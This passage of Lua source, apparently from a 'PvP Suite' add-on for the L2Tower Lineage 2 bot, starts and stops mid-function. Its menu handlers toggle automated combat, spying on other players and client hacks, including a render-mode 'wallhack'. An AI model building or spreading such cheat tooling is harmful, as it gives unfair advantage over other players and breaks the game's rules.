				ShowToClient("Enhances","You don't have a skill that can Interrupt E. Heal!");
				SubMenu("Enhances");
			end;
	elseif (action == "Interrupt Talismans") then
			if (iHaveIRh()) then
				if (PvPSuite[38]) then
					PvPSuite[38] = false;
					ShowToClient("Olympiad","Interrupt Talismans disabled!");
					SubMenu("Olympiad");
				else
					PvPSuite[38] = true;
					ShowToClient("Olympiad","Interrupt Talismans enabled!");
					SubMenu("Olympiad");
				end;
			else
				ShowToClient("Olympiad","You don't have a skill that can Interrupt Talismans!");
				SubMenu("Olympiad");
			end;
	elseif (action == "Inform Name/Clan/Class") then
			if (PvPSuite[44]) then
				PvPSuite[44] = false;
				ShowToClient("Olympiad","Inform Name/Clan/Class disabled!");
				SubMenu("Olympiad");
			else
				PvPSuite[44] = true;		
				alreadySaidOly = false;
				ShowToClient("Olympiad","Inform Name/Clan/Class enabled!");
				SubMenu("Olympiad");
			end;
	elseif (action == "Auto Riposte Stance") then
			if (iHaveSkill(340)) then
				if (PvPSuite[30]) then
					PvPSuite[30] = false;
					ShowToClient("Enhances","Auto Riposte Stance disabled!");
					SubMenu("Enhances");
				else
					PvPSuite[30] = true;
					ShowToClient("Enhances","Auto Riposte Stance enabled!");
					SubMenu("Enhances");
				end;
			else
				ShowToClient("Enhances","Your character doesn't have Riposte Stance!");
				SubMenu("Enhances");
			end;
	elseif (action == "Auto Self Cleanse") then
			if (iHaveCleanse()) then
				if (PvPSuite[31]) then
					PvPSuite[31] = false;
					ShowToClient("Enhances","Auto Self Cleanse disabled!");
					SubMenu("Enhances");
				else
					PvPSuite[31] = true;
					ShowToClient("Enhances","Auto Self Cleanse enabled!");
					SubMenu("Enhances");
				end;
			else
				ShowToClient("Enhances","Your character doesn't have a Cleanse skill!");
				SubMenu("Enhances");
			end;
	elseif (action == "Aggro Bot") then
			if (iHaveAggroSk()) then
				if (PvPSuite[32]) then
					PvPSuite[32] = false;
					ShowToClient("Enhances","Aggro Bot disabled!");
					SubMenu("Enhances");
				else
					Timer[2] = 0;
					PvPSuite[32] = true;
					ShowToClient("Enhances","Aggro Bot enabled! Target an enemy!");
					SubMenu("Enhances");
				end;
			else
				ShowToClient("Enhances","Your character doesn't have an Aggro skill!");
				SubMenu("Enhances");
			end;
	elseif (action == "Informer(Skills)") then
			if (PvPSuite[7]) then
				PvPSuite[7] = false;
				ShowToClient("Informer","(Skills) disabled!");
				SubMenu("Informers");
			else
				PvPSuite[7] = true;
				ShowToClient("Informer","(Skills) enabled!");
				SubMenu("Informers");
			end;
	elseif (action == "Informer(Chance/Cert)") then
			if (PvPSuite[8]) then
				PvPSuite[8] = false;
				ShowToClient("Informer","(Chance/Cert) disabled!");
				SubMenu("Informers");
			else
				PvPSuite[8] = true;
				ShowToClient("Informer","(Chance/Cert) enabled!");
				SubMenu("Informers");
			end;
	elseif (action == "Informer(Buffs)") then
			if (PvPSuite[9]) then
				PvPSuite[9] = false;
				ShowToClient("Informer","(Buffs) disabled!");
				SubMenu("Informers");
			else
				PvPSuite[9] = true;
				ShowToClient("Informer","(Buffs) enabled!");
				SubMenu("Informers");
			end;
	elseif (action == "Informer(Augments)") then
			if (PvPSuite[35]) then
				PvPSuite[35] = false;
				ShowToClient("Informer","(Augments) disabled!");
				SubMenu("Informers");
			else
				PvPSuite[35] = true;
				ShowToClient("Informer","(Augments) enabled!");
				SubMenu("Informers");
			end;
	elseif (action == "Mass Informer") then
			if (PvPSuite[62]) then
				PvPSuite[62] = false;
				ShowToClient("Mass Informer","Disabled!");
				SubMenu("Informers");
			else
				PvPSuite[62] = true;
				ShowToClient("Mass Informer","Enabled!");
				SubMenu("Informers");
			end;
	elseif (action == "All Informers") then
			if (PvPSuite[63]) then
				PvPSuite[63] = false;
				ShowToClient("All Informers","Disabled!");
				SubMenu("Informers");
			else
				PvPSuite[63] = true;
				ShowToClient("All Informers","Enabled!");
				SubMenu("Informers");
			end;
	elseif (action == "Party Informer(Skills)") then
			if (PvPSuite[10]) then
				PvPSuite[10] = false;
				ShowToClient("Party Informer","(Skills) disabled!");
				SubMenu("Party Informers");
			else
				PvPSuite[10] = true;
				ShowToClient("Party Informer","(Skills) enabled!");
				SubMenu("Party Informers");
			end;
	elseif (action == "Party Informer(Chance/Cert)") then
			if (PvPSuite[11]) then
				PvPSuite[11] = false;
				ShowToClient("Party Informer","(Chance/Cert) disabled!");
				SubMenu("Party Informers");
			else
				PvPSuite[11] = true;
				ShowToClient("Party Informer","(Chance/Cert) enabled!");
				SubMenu("Party Informers");
			end;
	elseif (action == "Party Informer(Buffs)") then
			if (PvPSuite[12]) then
				PvPSuite[12] = false;
				ShowToClient("Party Informer","(Buffs) disabled!");
				SubMenu("Party Informers");
			else
				PvPSuite[12] = true;
				ShowToClient("Party Informer","(Buffs) enabled!");
				SubMenu("Party Informers");
			end;
	elseif (action == "Party Informer(Augments)") then
			if (PvPSuite[36]) then
				PvPSuite[36] = false;
				ShowToClient("Party Informer","(Augments) disabled!");
				SubMenu("Party Informers");
			else
				PvPSuite[36] = true;
				ShowToClient("Party Informer","(Augments) enabled!");
				SubMenu("Party Informers");
			end;
	elseif (action == "Auto Assist") then
			if (PvPSuite[25] == "") then
				ShowToClient("A Better Assist","Please Set MA first!");
				SubMenu("A Better Assist");
			else
				if (PvPSuite[13]) then
					PvPSuite[13] = false;
					TargetFirst = false;
					ShowToClient("A Better Assist","Auto Assist disabled!");
					SubMenu("A Better Assist");
				else
					PvPSuite[13] = true;
					ShowToClient("A Better Assist","Auto Assist enabled!");
					TargetFirst = true;
					SubMenu("A Better Assist");
				end;
			end;
	elseif (action == "Informer(Not Assisting)") then
			if (PvPSuite[14]) then
				PvPSuite[14] = false;
				ShowToClient("MA Informer","(Not Assisting) disabled!");
				SubMenu("Main Assister");
			else
				Timer[3] = 0;
				PvPSuite[14] = true;
				ShowToClient("MA Informer","(Not Assisting) enabled!");
				SubMenu("Main Assister");
			end;
	elseif (action == "Informer(Regroup)") then
			if (PvPSuite[15]) then
				PvPSuite[15] = false;
				ShowToClient("MA Informer","(Regroup) disabled!");
				SubMenu("Main Assister");
			else
				Timer[3] = 0;
				PvPSuite[15] = true;
				ShowToClient("MA Informer","(Regroup) enabled!");
				SubMenu("Main Assister");
			end;
	elseif (action == "Olympiad Informer") then
			if (PvPSuite[39]) then
				PvPSuite[39] = false;
				ShowToClient("Olympiad","Informer disabled!");
				SubMenu("Olympiad");
			else
				PvPSuite[39] = true;
				ShowToClient("Olympiad","Informer enabled!");
				SubMenu("Olympiad");
			end;
	elseif (action == "Set MA") then
			if (GetTarget() ~= nil) then
				if (GetTarget():GetName() == PvPSuite[25] and GetTarget():IsPlayer()) then
					ShowToClient("A Better Assist",PvPSuite[25].." is already set as MA!");
					SubMenu("A Better Assist");
				elseif (GetTarget():GetName() == MyName) then
						ShowToClient("A Better Assist","You cannot set yourself as main assister!");
						SubMenu("A Better Assist");
				else
					if (GetTarget():IsPlayer()) then
						PvPSuite[25] = GetTarget():GetName();
						ShowToClient("A Better Assist",PvPSuite[25].." has been set as MA!");
						if (GetUserByName(PvPSuite[25]):IsFriend() == false) then
							ShowToClient("A Better Assist",PvPSuite[25].." is not your friend!");
							ShowToClient("A Better Assist","Take care!");
						end;
						SubMenu("A Better Assist");
					else
						ShowToClient("A Better Assist","Selected target is not a player!");
						SubMenu("A Better Assist");
					end;
				end;
			else
				ShowToClient("A Better Assist","Please target someone!");
				SubMenu("A Better Assist");
			end;
	elseif (action == "Copy Target") then
			if (GetTarget() ~= nil) then
				if (GetTarget():GetName() == CopycatName) then
					ShowToClient("Copycat","You are already copying "..CopycatName);
					DoDialog("Copycat");
				elseif (GetTarget():GetName() == MyName) then
						ShowToClient("Copycat","You cannot copy yourself!");
						DoDialog("Copycat");
				elseif (GetTarget():IsPlayer() == false) then
						ShowToClient("Copycat","Please select a player to copy!");
						DoDialog("Copycat");
				else
					CopycatName = GetTarget():GetName();
					ShowToClient("Copycat","You are now copying "..CopycatName);
					DoDialog("Copycat");
				end;
			else
				ShowToClient("Copycat","Please target someone!");
				DoDialog("Copycat");
			end;
	elseif (action == "Clear MA") then
			if (PvPSuite[25] ~= "") then
				PvPSuite[25] = "";
				PvPSuite[13] = false;
				TargetFirst = false;
				ShowToClient("A Better Assist","MA Cleared!");
				ShowToClient("A Better Assist","Auto Assist disabled!");
				SubMenu("A Better Assist");
			end;
	elseif (action == "Clear Player") then
			if (CopycatName ~= "") then
				CopycatName = "";
				Copycat = false;
				ShowToClient("Copycat","Player cleared!");
				ShowToClient("Copycat","Disabled!");
				DoDialog("Copycat");
			end;
	elseif (action == "CopycatED") then
			if (CopycatName == "") then
				ShowToClient("Copycat","Please set a player to copy first!");
				DoDialog("Copycat");
			else
				if (Copycat) then
					Copycat = false;
					ShowToClient("Copycat","Disabled!");
					DoDialog("Copycat");
				else
					Copycat = true;
					ShowToClient("Copycat","Enabled!");
					DoDialog("Copycat");
				end;
			end;
	elseif (action == "Documentation") then
			if (PvPSuite[17]) then
				ShowToClient("Help Center","IG Documentation disabled!");
				PvPSuite[17] = false;
				SubMenu("Help Center");
			else
				ShowToClient("Help Center","IG Documentation enabled!");
				PvPSuite[17] = true;
				SubMenu("Help Center");
			end;
	elseif (action == "Target Teleport") then
			if (PvPSuite[19]) then
				ShowToClient("Spy","Target Teleport disabled!");
				PvPSuite[19] = false;
				SubMenu("Spy");
			else
				ShowToClient("Spy","Target Teleport enabled!");
				PvPSuite[19] = true;
				SubMenu("Spy");
			end;
	elseif (action == "Class On Title") then
			if (PvPSuite[43]) then
				ShowToClient("Spy","Class On Title disabled!");
				ProcessCommand(".enableChangeTargetTitle");
				PvPSuite[43] = false;
				SubMenu("Spy");
			else
				ShowToClient("Spy","Class On Title enabled!");
				Command("/unstuck");
				ProcessCommand(".enableChangeTargetTitle");
				ShowToClient("WARNING","For it to work you must have DISABLED TITLE TARGET CHANGE!");
				ShowToClient("WARNING","LET UNSTUCK FINISH OR RELOG TO MAKE IT WORK!");
				PvPSuite[43] = true;
				SubMenu("Spy");
			end;
	elseif (action == "Screen Informer(Skills)") then
			if (IsPremium()) then
				if (PvPSuite[20]) then
					ShowToClient("Premium","Screen Informer(Skills) disabled!");
					PvPSuite[20] = false;
					SubMenu("Premium");
				else
					ShowToClient("Premium","Screen Informer(Skills) enabled!");
					PvPSuite[20] = true;
					SubMenu("Premium");
				end;
			else
				ShowToClient("PvPSuite","You don't have L2Tower Premium!");
				SubMenu("Premium");
			end;
	elseif (action == "Screen Informer(Chance/Cert)") then
			if (IsPremium()) then
				if (PvPSuite[21]) then
					ShowToClient("Premium","Screen Informer(Chance/Cert) disabled!");
					PvPSuite[21] = false;
					SubMenu("Premium");
				else
					ShowToClient("Premium","Screen Informer(Chance/Cert) enabled!");
					PvPSuite[21] = true;
					SubMenu("Premium");
				end;
			else
				ShowToClient("PvPSuite","You don't have L2Tower Premium!");
				SubMenu("Premium");
			end;
	elseif (action == "Screen Informer(Buffs)") then
			if (IsPremium()) then
				if (PvPSuite[22]) then
					ShowToClient("Premium","Screen Informer(Buffs) disabled!");
					PvPSuite[22] = false;
					SubMenu("Premium");
				else
					ShowToClient("Premium","Screen Informer(Buffs) enabled!");
					PvPSuite[22] = true;
					SubMenu("Premium");
				end;
			else
				ShowToClient("PvPSuite","You don't have L2Tower Premium!");
				SubMenu("Premium");
			end;
	elseif (action == "Screen Informer(Augments)") then
			if (IsPremium()) then
				if (PvPSuite[37]) then
					ShowToClient("Premium","Screen Informer(Augments) disabled!");
					PvPSuite[37] = false;
					SubMenu("Premium");
				else
					ShowToClient("Premium","Screen Informer(Augments) enabled!");
					PvPSuite[37] = true;
					SubMenu("Premium");
				end;
			else
				ShowToClient("PvPSuite","You don't have L2Tower Premium!");
				SubMenu("Premium");
			end;
	elseif (action == "Spy Hide") then
			if (IsPremium()) then
				if (PvPSuite[23]) then
					ShowToClient("Premium","Spy Hide disabled!");
					PvPSuite[23] = false;
					SubMenu("Premium");
				else
					ShowToClient("Premium","Spy Hide enabled!");
					PvPSuite[23] = true;
					SubMenu("Premium");
				end;
			else
				ShowToClient("PvPSuite","You don't have L2Tower Premium!");
				SubMenu("Premium");
			end;
	elseif (action == "Cancel Snipe(Dash)") then
			if (IsPremium()) then
				if (Me:GetClass() == 92) then
					if (PvPSuite[24]) then
						ShowToClient("Premium","Cancel Snipe(Dash) disabled!");
						PvPSuite[24] = false;
						SubMenu("Premium");
					else
						ShowToClient("Premium","Cancel Snipe(Dash) enabled!");
						PvPSuite[24] = true;
						SubMenu("Premium");
					end;
				else
					ShowToClient("Premium","This function is only for Sagittarius!");
					SubMenu("Premium");
				end;
			else
				ShowToClient("PvPSuite","You don't have L2Tower Premium!");
				SubMenu("Premium");
			end;
	elseif (action == "Ultimate Zoom") then
			if (IsPremium()) then
				ClientExec("set Engine.LineagePlayerController MinZoomingDist -65535");
				ClientExec("set Engine.LineagePlayerController MaxZoomingDist 65535");
				ShowToClient("Premium","Ultimate Zoom enabled, right click will return zoom to default!");
				ShowToClient("Premium","Use L2Lige for a permanent ultimate zoom!");
				DoDialog("Client Mods");
			else
				ShowToClient("PvPSuite","You don't have L2Tower Premium!");
				DoDialog("Client Mods");
			end;
	elseif (action == "Boost Video") then
			if (IsPremium()) then
				ClientExec("set Engine.GameEngine CacheSizeMegs 512");
				ClientExec("set Editor.EditorEngine CacheSizeMegs 512");
				DoDialog("Client Mods");
			else
				ShowToClient("PvPSuite","You don't have L2Tower Premium!");
				DoDialog("Client Mods");
			end;
	elseif (action == "SHRadii") then
			if (IsPremium()) then
				ClientExec("Show Radii");
				DoDialog("Client Mods");
			else
				ShowToClient("PvPSuite","You don't have L2Tower Premium!");
				DoDialog("Client Mods");
			end;
	elseif (action == "SHStaticmeshes") then
			if (IsPremium()) then
				ClientExec("Show Staticmeshes");
				DoDialog("Client Mods");
			else
				ShowToClient("PvPSuite","You don't have L2Tower Premium!");
				DoDialog("Client Mods");
			end;
	elseif (action == "SHTerrain") then
			if (IsPremium()) then
				ClientExec("Show Terrain");
				DoDialog("Client Mods");
			else
				ShowToClient("PvPSuite","You don't have L2Tower Premium!");
				DoDialog("Client Mods");
			end;
	elseif (action == "SHFog") then
			if (IsPremium()) then
				ClientExec("Show Fog");
				DoDialog("Client Mods");
			else
				ShowToClient("PvPSuite","You don't have L2Tower Premium!");
				DoDialog("Client Mods");
			end;
	elseif (action == "SHFps") then
			if (IsPremium()) then
				ClientExec("stat fps");
				DoDialog("Client Mods");
			else
				ShowToClient("PvPSuite","You don't have L2Tower Premium!");
				DoDialog("Client Mods");
			end;
	elseif (action == "SHNet") then
			if (IsPremium()) then
				ClientExec("stat net");
				DoDialog("Client Mods");
			else
				ShowToClient("PvPSuite","You don't have L2Tower Premium!");
				DoDialog("Client Mods");
			end;
	elseif (action == "SHWallhack") then
			if (IsPremium()) then
				if (wallHacking) then
					ClientExec("rmode 5");
					wallHacking = false;
				else
					ClientExec("rmode 1");
					wallHacking = true;
				end;
				DoDialog("Client Mods");
			else
				ShowToClient("PvPSuite","You don't have L2Tower Premium!");
				DoDialog("Client Mods");
			end;
	elseif (action == "Flashing Title(Slow)") then
			BreakTitle();
			FlashTitleSlow = true;
			this:StartThread("TitleEffect");
	elseif (action == "Flashing Title(Fast)") then
			BreakTitle();
			FlashTitleFast = true;
			this:StartThread("TitleEffect");
	elseif (action == "Moving Title") then
			if ((string.len(Me:GetNickName()) > 15)) then
				ShowToClient("Title Effects","For moving title, your title must not exceed 15 characters!")
				DoDialog("Title Effects");
			else
				BreakTitle();
				MoveTitle = true;
				this:StartThread("TitleEffect");
			end;
	elseif (action == "Connection Checker") then
			ShowToClient("Connection Checker","Checking your connection..");
			DoDialog(action);
	elseif (action == "YouTube") then
			DoDialog(action);
	elseif (action == "ShowOnEachRHit") then
			if (ShowOnEachReceivedHit) then
				ShowOnEachReceivedHit = false;
			else
				ShowOnEachReceivedHit = true;
			end;
			DoDialog("Damage Counter");
	elseif (action == "ShowOnEachDHit") then
			if (ShowOnEachDoneHit) then
				ShowOnEachDoneHit = false;
			else
				ShowOnEachDoneHit = true;
			end;
			DoDialog("Damage Counter");
	elseif (action == "ShowEachM") then
			if (ShowEachMin) then
				ShowEachMin = false;
			else
				Timer[4] = 0;
				ShowEachMin = true;
			end;
			DoDialog("Damage Counter");
	elseif (action == "ShowPMEachM") then
			if (ShowPMEachMin) then
				ShowPMEachMin = false;
			else
				Timer[4] = 0;
				ShowPMEachMin = true;
			end;
			DoDialog("Damage Counter");
	elseif (action == "ClearC") then
			damageDone = 0;
			damageReceived = 0;
			DoDialog("Damage Counter");
	else
		DoDialog(action);
	end;
end;
function DoDialog(action)
	local Param = "";
	if ((action == "Last 10 Targeters") or (action == "Target Equipment") or (action == "Radar") or (action == "Radar(PK/War/PvP Only)")) then
		Param = "Spy";
	elseif ((action == "Near Players") or (action == "Damage Counter")) then
			Param = "Olympiad";
	elseif (action == "Near Supporters") then
			Param = "Main Assister";
	elseif ((action == "Client Mods") or (action == "Spam Chat(No CB)")) then
			Param = "Premium";
	elseif ((action == "Title Effects") or (action == "Copycat") or (action == "Send Encrypted Message") or (action == "Auto Message On Kill") or (action == "Random Quote") or (action == "Connection Checker") or (action == "Mini Games") or (action == "YouTube") or (action == "Stats") or (action == "More Stats")) then
			Param = "Other";
	elseif ((action == "Contact Info") or (action == "Commands") or (action == "Changelog")) then
			Param = "Help Center";
	end;
	local html = THtmlGenerator("PvP Suite > "..action);
	if (Param ~= "") then
		html = THtmlGenerator("PvP Suite > "..Param.." > "..action);
	end;
	html:AddHtml('<center>');
	if ((action ~= "Radar") and (action ~= "Radar(PK/War/PvP Only)")) then
		html:AddHtml('<img src="L2UI_CH3.herotower_deco" width=256 height=32 align=left>');
	end;
	if (action == "Near Supporters") then
		local SFound = 0;
		html:AddButton(THtmlAction("/ns"),THtmlButtonStyle.BUTTON_ACTION, "Reload",false,"","",120,21);
		local supporters = GetPlayerList();
		for user in supporters.list do
			if (Me:GetRangeTo(user) < 1500) then
				if (user:IsFriend() == false) then
					if ((L2Class2String(user:GetClass()) == "Cardinal") or (L2Class2String(user:GetClass()) == "Dominator") or (L2Class2String(user:GetClass()) == "Judicator")) then
						if (SFound == 0) then
							html:AddHtml('<font color="FF0000">Click to target</font>');
						end;
						local cln = "";
						if ((user:GetClanName() ~= "") and (user:GetClanName() ~= nil)) then
							cln = ('('..user:GetClanName()..')');
						end;
						html:AddButton(THtmlAction("/ns"):AddParam(user:GetName()),THtmlButtonStyle.BUTTON_ACTION,user:GetName()..cln..' => '..L2Class2String(user:GetClass()),false,"","",280,25);
						html:AddHtml("</ br>");	
						SFound = SFound + 1;
					end;
				end;
			end;
		end;
		if (SFound == 0) then
			html:AddHtml('</ br><font color="FF0000">Nothing found :(</font></ br>');
		else
			html:AddHtml('</ br><font color="FF00FF">Total Supporters Found: </font>'..SFound);
		end;
	elseif (action == "Near Players") then
			local PFound = 0;
			html:AddButton(THtmlAction("/np"),THtmlButtonStyle.BUTTON_ACTION, "Reload",false,"","",120,21);
			local players = GetPlayerList();
			for user in players.list do
				if (PFound == 0) then
					html:AddHtml('</ br><font color="FF0000">Click to target</font></ br>');
				end;
				html:AddHtml("</ br>");	
				local cln2 = "";
				if (user:GetClanName() ~= "") then
					cln2 = ('('..user:GetClanName()..')');
				end;
				html:AddButton(THtmlAction("/np"):AddParam(user:GetName()),THtmlButtonStyle.BUTTON_ACTION,user:GetName()..cln2..' => '..L2Class2String(user:GetClass()),false,"","",280,25);
				html:AddHtml("</ br>");	
				PFound = PFound + 1;
			end;
			if (PFound == 0) then
				html:AddHtml('</ br><font color="FF0000">Nothing found :(</font></ br>');
			else
				html:AddHtml('</ br><font color="00FF00">Total Players Found: </font>'..PFound);
			end;
	elseif (action == "Damage Counter") then
			html:AddHtml('<center>');
			html:AddHtml('<center><table bgcolor=303030 cellspacing=4 cellpadding=2 width=280><tr><td align=center valign=center width=236>');
			html:AddHtml('<center><font color="00FF00">Total Damage Done: '..damageDone.." </font></center>");
			html:AddHtml("</td></tr><tr><td>");
			html:AddHtml('<center><font color="FF0000">Total Damage Received: '..damageReceived.." </font></center>");
			html:AddHtml("</td></tr></table></center>");
			html:AddHtml('</br ></br >');
			html:AddHtml("<center><table bgcolor=303030 cellspacing=4 cellpadding=2 width=260><tr><td align=center valign=center width=236>");
			html:AddHtml('<font color="00FF00">Show Dialog Each Done Hit:</font>');
			html:AddHtml("</td><td>");
			local Text = "Disabled";
			if (ShowOnEachDoneHit) then
				Text = "Enabled";
			end;
			html:AddButton(THtmlAction("/doaction"):AddParam("ShowOnEachDHit"),THtmlButtonStyle.BUTTON_ACTION, Text,false,"","",80,30);
			html:AddHtml("</td></tr></table></center>");
			html:AddHtml("<center><table bgcolor=303030 cellspacing=4 cellpadding=2 width=260><tr><td align=center valign=center width=236>");
			html:AddHtml('<font color="FF0000">Show Dialog Each Received Hit:</font>');
			html:AddHtml("</td><td>");
			local Text = "Disabled";
			if (ShowOnEachReceivedHit) then
				Text = "Enabled";
			end;
			html:AddButton(THtmlAction("/doaction"):AddParam("ShowOnEachRHit"),THtmlButtonStyle.BUTTON_ACTION, Text,false,"","",80,30);
			html:AddHtml("</td></tr></table></center>");
			html:AddHtml("<center><table bgcolor=303030 cellspacing=4 cellpadding=2 width=260><tr><td align=center valign=center width=236>");
			html:AddHtml('<font color="FFFF00">Show Dialog Each Minute:</font>');
			html:AddHtml("</td><td>");
			local Text = "Disabled";
			if (ShowEachMin) then
				Text = "Enabled";
			end;
			html:AddButton(THtmlAction("/doaction"):AddParam("ShowEachM"),THtmlButtonStyle.BUTTON_ACTION, Text,false,"","",80,30);
			html:AddHtml("</td></tr></table></center>");
			html:AddHtml("<center><table bgcolor=303030 cellspacing=4 cellpadding=2 width=260><tr><td align=center valign=center width=236>");
			html:AddHtml('<font color="F901F8">Show PM Each Minute:</font>');
			html:AddHtml("</td><td>");
			local Text = "Disabled";
			if (ShowPMEachMin) then
				Text = "Enabled";
			end;
			html:AddButton(THtmlAction("/doaction"):AddParam("ShowPMEachM"),THtmlButtonStyle.BUTTON_ACTION, Text,false,"","",80,30);
			html:AddHtml("</td></tr></table></center>");
			html:AddHtml("<center></br >");
			html:AddButton(THtmlAction("/doaction"):AddParam("ClearC"),THtmlButtonStyle.BUTTON_ACTION,"Clear Damages",false,"","",150,30);
			html:AddHtml('<font color="777777">No damages or options are saved on exit!</font></center>');
	elseif (action == "Last 10 Targeters") then
			if (lastTargetersCount == 0) then
				html:AddHtml("</ br>");
				html:AddHtml('</ br><font color="FF0000">Nothing found :(</font></ br>');
			else
				html:AddHtml("</ br>");
				local NTMP = 10;
				for I = 1,lastTargetersCount do
					html:Table_Start(true, false, 250);
					html:Table_AddColumns(1);
					html:AddHtml(tostring(Target[NTMP]));
					NTMP = NTMP - 1;
					html:Table_End();
					html:AddHtml("</br>");
				end;
				html:AddHtml('</ br> Current time: <font color="FFFFCC">'..os.date("%H:%M:%S").."</font>");
			end;
	elseif (action == "Target Equipment") then
			html:AddHtml("</ br>");
			local Gender = GetTarget():GetGenderId();
			if (Gender == 1) then
				Gender = "Female";
			elseif (Gender == 0) then
					Gender = "Male";
			end;
			html:AddHtml('<table bgcolor=303030 cellspacing=4 width=236><tr><td align=left valign=top width=236><font color=FF8040>Name: '..GetTarget():GetName()..'</font></td><td align=right valign=top width=200><font color=FF8040>Sex: '..Gender..'</font></td></tr></table>');
			html:AddHtml('</ br><table bgcolor=303030 cellspacing=4 width=236><tr><td align=left valign=top width=236><font color=FF8040>Class: '..L2Class2String(GetTarget():GetClass())..'</font></td><td align=right valign=top width=250><font color=FF8040>Main: '..L2Class2String(GetTarget():GetBaseClass())..'</font></td></tr></table>');
			local Item = GetTarget():GetEquip_HelmId();
			if ((Item ~= 0) and (Item ~= nil)) then
				html:AddHtml("</br ><table bgcolor=303030 width=236 cellspacing=4><tr><td align=left valign=top width=290>Helmet </ br><font color=FF8040>" ..GetItemName(Item).. "</font></td><td height=45 width=36><img src="..GetItemIcon(Item).." height=32 width=32></td></tr></table>");
			end;
			Item = GetTarget():GetEquip_BodyUpId();
			if ((Item ~= 0) and (Item ~= nil)) then
				html:AddHtml("</br ><table bgcolor=303030 width=236 cellspacing=4><tr><td align=left valign=top width=290>Upper Body </ br><font color=FF8040>" ..GetItemName(Item).. "</font></td><td height=45 width=36><img src="..GetItemIcon(Item).." height=32 width=32></td></tr></table>");
			end;
			Item = GetTarget():GetEquip_BodyDownId();
			if ((Item ~= 0) and (Item ~= nil)) then
				html:AddHtml("</br ><table bgcolor=303030 width=236 cellspacing=4><tr><td align=left valign=top width=290>Lower Body </ br><font color=FF8040>" ..GetItemName(Item).. "</font></td><td height=45 width=36><img src="..GetItemIcon(Item).." height=32 width=32></td></tr></table>");
			end;
			Item = GetTarget():GetEquip_GlovesId();
			if ((Item ~= 0) and (Item ~= nil)) then
				html:AddHtml("</br ><table bgcolor=303030 width=236 cellspacing=4><tr><td align=left valign=top width=290>Gloves </ br><font color=FF8040>" ..GetItemName(Item).. "</font></td><td height=45 width=36><img src="..GetItemIcon(Item).." height=32 width=32></td></tr></table>");
			end;
			Item = GetTarget():GetEquip_BootsId();
			if ((Item ~= 0) and (Item ~= nil)) then
				html:AddHtml("</br ><table bgcolor=303030 width=236 cellspacing=4><tr><td align=left valign=top width=290>Boots </ br><font color=FF8040>" ..GetItemName(Item).. "</font></td><td height=45 width=36><img src="..GetItemIcon(Item).." height=32 width=32></td></tr></table>");
			end;
			Item = GetTarget():GetEquip_CloakId();
			if ((Item ~= 0) and (Item ~= nil)) then
				html:AddHtml("</br ><table bgcolor=303030 width=236 cellspacing=4><tr><td align=left valign=top width=290>Cloak </ br><font color=FF8040>" ..GetItemName(Item).. "</font></td><td height=45 width=36><img src="..GetItemIcon(Item).." height=32 width=32></td></tr></table>");
			end;
			Item = GetTarget():GetEquip_UnderwearId();
			if ((Item ~= 0) and (Item ~= nil)) then
				html:AddHtml("</br ><table bgcolor=303030 width=236 cellspacing=4><tr><td align=left valign=top width=290>Shirt </ br><font color=FF8040>" ..GetItemName(Item).. "</font></td><td height=45 width=36><img src="..GetItemIcon(Item).." height=32 width=32></td></tr></table>");
			end;
			Item = GetTarget():GetEquip_BeltId();
			if ((Item ~= 0) and (Item ~= nil)) then
				html:AddHtml("</br ><table bgcolor=303030 width=236 cellspacing=4><tr><td align=left valign=top width=290>Belt </ br><font color=FF8040>" ..GetItemName(Item).. "</font></td><td height=45 width=36><img src="..GetItemIcon(Item).." height=32 width=32></td></tr></table>");
			end; 
			Item = GetTarget():GetEquip_WeaponId();
			if ((Item ~= 0) and (Item ~= nil)) then
				html:AddHtml("</br ><table bgcolor=303030 width=236 cellspacing=4><tr><td align=left valign=top width=290>Weapon - Enchant: <font color=B00000>"..GetTarget():GetWeaponEnchantLevel().."</font></ br><font color=FF8040>" ..GetItemName(Item).. "</font></td><td height=45 width=36><img src="..GetItemIcon(Item).." height=32 width=32></td></tr></table>");
			end; 
			Item = GetTarget():GetEquip_ShieldId();
			if ((Item ~= 0) and (Item ~= nil)) then
				html:AddHtml("</br ><table bgcolor=303030 width=236 cellspacing=4><tr><td align=left valign=top width=290>Shield </ br><font color=FF8040>" ..GetItemName(Item).. "</font></td><td height=45 width=36><img src="..GetItemIcon(Item).." height=32 width=32></td></tr></table>");
			end; 
			Item = GetTarget():GetEquip_Accessory1Id();
			if ((Item ~= 0) and (Item ~= nil)) then
				html:AddHtml("</br ><table bgcolor=303030 width=236 cellspacing=4><tr><td align=left valign=top width=290>Accessory(1) </ br><font color=FF8040>" ..GetItemName(Item).. "</font></td><td height=45 width=36><img src="..GetItemIcon(Item).." height=32 width=32></td></tr></table>");
			end; 
			Item = GetTarget():GetEquip_Accessory2Id();
			if ((Item ~= 0) and (Item ~= nil)) then
				html:AddHtml("</br ><table bgcolor=303030 width=236 cellspacing=4><tr><td align=left valign=top width=290>Accessory(2) </ br><font color=FF8040>" ..GetItemName(Item).. "</font></td><td height=45 width=36><img src="..GetItemIcon(Item).." height=32 width=32></td></tr></table>");
			end; 
			Item = GetTarget():GetEquip_AgationId();
			if ((Item ~= 0) and (Item ~= nil)) then
				html:AddHtml("</br ><table bgcolor=303030 width=236 cellspacing=4><tr><td align=left valign=top width=290>Agathion </ br><font color=FF8040>" ..GetItemName(Item).. "</font></td><td height=45 width=36><img src="..GetItemIcon(Item).." height=32 width=32></td></tr></table>");
			end; 
			Item = GetTarget():GetEquip_Talizman1Id();
			if ((Item ~= 0) and (Item ~= nil)) then
				html:AddHtml("</br ><table bgcolor=303030 width=236 cellspacing=4><tr><td align=left valign=top width=290>Talisman(1) </ br><font color=FF8040>" ..GetItemName(Item).. "</font></td><td height=45 width=36><img src="..GetItemIcon(Item).." height=32 width=32></td></tr></table>");
			end; 
			Item = GetTarget():GetEquip_Talizman2Id();
			if ((Item ~= 0) and (Item ~= nil)) then
				html:AddHtml("</br ><table bgcolor=303030 width=236 cellspacing=4><tr><td align=left valign=top width=290>Talisman(2) </ br><font color=FF8040>" ..GetItemName(Item).. "</font></td><td height=45 width=36><img src="..GetItemIcon(Item).." height=32 width=32></td></tr></table>");
			end; 
			Item = GetTarget():GetEquip_Talizman3Id();
			if ((Item ~= 0) and (Item ~= nil)) then
				html:AddHtml("</br ><table bgcolor=303030 width=236 cellspacing=4><tr><td align=left valign=top width=290>Talisman(3) </ br><font color=FF8040>" ..GetItemName(Item).. "</font></td><td height=45 width=36><img src="..GetItemIcon(Item).." height=32 width=32></td></tr></table>");
			end; 
			Item = GetTarget():GetEquip_Talizman4Id();
			if ((Item ~= 0) and (Item ~= nil)) then
